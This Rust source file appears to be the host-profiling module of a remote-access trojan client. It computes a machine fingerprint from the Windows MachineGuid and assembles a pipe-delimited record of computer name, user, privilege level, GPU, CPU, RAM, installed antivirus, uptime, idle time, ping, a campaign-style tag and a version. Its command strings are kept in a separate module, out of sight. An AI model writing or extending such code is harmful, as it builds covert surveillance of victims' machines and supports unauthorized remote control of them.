use std::{env, process::Command};

use ed25519_dalek::SigningKey;
use hkdf::Hkdf;
use sha2::{Digest, Sha256};

use crate::text;

pub fn fingerprint() -> String {
    let (machine_id, hwid) = identity();
    derive(&machine_id, &hwid)
}

#[cfg(test)]
fn from_id(machine_id: &str) -> String {
    let hwid = digest(format!("{machine_id}|windows").as_bytes());
    derive(machine_id, &hwid)
}

fn derive(machine_id: &str, hwid: &str) -> String {
    let hk = Hkdf::<Sha256>::new(Some(hwid.as_bytes()), machine_id.as_bytes());
    let mut seed = [0u8; 32];
    hk.expand(b"mirage-identity", &mut seed).expect("hkdf");
    let key = SigningKey::from_bytes(&seed);
    hex(&Sha256::digest(key.verifying_key().to_bytes()))
}

fn identity() -> (String, String) {
    if let Some(id) = machine_id() {
        let hwid = digest(format!("{id}|windows").as_bytes());
        return (id, hwid);
    }

    let hwid = digest(
        format!(
            "{}|{}|windows",
            env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".into()),
            env::var("USERNAME").unwrap_or_else(|_| "unknown".into())
        )
        .as_bytes(),
    );
    (hwid.clone(), hwid)
}

pub fn record(target: &str, ping_ms: Option<u128>, fp: &str) -> String {
    let nickname = clean(env::var("COMPUTERNAME").unwrap_or_else(|_| "Windows".into()));
    let user = clean(env::var("USERNAME").unwrap_or_else(|_| "Unknown".into()));
    let cpu = clean(env::var("PROCESSOR_IDENTIFIER").unwrap_or_else(|_| "Unknown".into()));
    let privileges = clean(ps(text::PRIV));
    let gpu = clean(ps(text::GPU));
    let antivirus = clean(ps(text::AV));
    let ram = clean(ps(text::RAM));
    let uptime = clean(ps(text::UPTIME));
    let afk = afk();
    let country = if matches!(target, "127.0.0.1" | "::1" | "localhost") {
        "Local"
    } else {
        "Unknown"
    };
    let hwid = machine_id().unwrap_or_else(fallback_display_hwid);

    [
        country.into(),
        nickname,
        text::TAG.into(),
        user,
        text::VERSION.into(),
        privileges,
        "Windows".into(),
        gpu,
        cpu,
        ram,
        antivirus,
        uptime,
        afk,
        ping_ms.map_or_else(|| "Unknown".into(), |v| format!("{v} ms")),
        hwid,
        fp.to_owned(),
    ]
    .into_iter()
    .map(clean)
    .collect::<Vec<_>>()
    .join("|")
}

fn machine_id() -> Option<String> {
    #[cfg(windows)]
    {
        let Ok(out) = Command::new(text::REG)
            .args([text::REG_QUERY, text::REG_64, text::REG_VALUE, text::REG_QUERY_KEY])
            .output()
        else {
            return None;
        };
        let s = String::from_utf8_lossy(&out.stdout);
        return s.lines().find_map(|line| {
            let mut p = line.split_whitespace();
            let key = p.next()?;
            let _ty = p.next()?;
            let value = p.next()?;
            key.eq_ignore_ascii_case(text::REG_QUERY_KEY)
                .then(|| value.to_string())
        });
    }
    #[cfg(not(windows))]
    {
        None
    }
}

fn fallback_display_hwid() -> String {
    env::var("COMPUTERNAME").unwrap_or_else(|_| "Unknown".into())
}

fn digest(bytes: &[u8]) -> String {
    hex(&Sha256::digest(bytes))
}

fn afk() -> String {
    #[cfg(windows)]
    {
        #[repr(C)]
        struct LastInput {
            cb_size: u32,
            tick: u32,
        }
        #[link(name = "user32")]
        unsafe extern "system" {
            fn GetLastInputInfo(info: *mut LastInput) -> i32;
        }
        #[link(name = "kernel32")]
        unsafe extern "system" {
            fn GetTickCount() -> u32;
        }

        let mut info = LastInput {
            cb_size: core::mem::size_of::<LastInput>() as u32,
            tick: 0,
        };
        if unsafe { GetLastInputInfo(&mut info) } != 0 {
            let now = unsafe { GetTickCount() };
            return format!("{}s", now.wrapping_sub(info.tick) / 1000);
        }
    }
    "0s".into()
}

fn ps(script: &str) -> String {
    #[cfg(windows)]
    {
        Command::new(text::PS)
            .args([text::PS_ARG[0], text::PS_ARG[1], text::PS_ARG[2], script])
            .output()
            .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
            .unwrap_or_default()
    }
    #[cfg(not(windows))]
    {
        let _ = script;
        String::new()
    }
}

fn clean(v: String) -> String {
    let s = v.replace('|', "/").replace(['\r', '\n'], " ").trim().to_string();
    if s.is_empty() {
        "Unknown".into()
    } else {
        s
    }
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

#[cfg(test)]
mod tests {
    use super::from_id;

    #[test]
    fn fingerprint_contract() {
        assert_eq!(
            from_id("00112233-4455-6677-8899-aabbccddeeff"),
            "df5d93dab28d0df783ecafe806a225c622d128a792c12c5f16f756faf563ee2d"
        );
    }

    #[test]
    fn telemetry_contract() {
        let fp = "0".repeat(64);
        assert_eq!(
            super::record("127.0.0.1", Some(1), &fp).split('|').count(),
            16
        );
    }
}
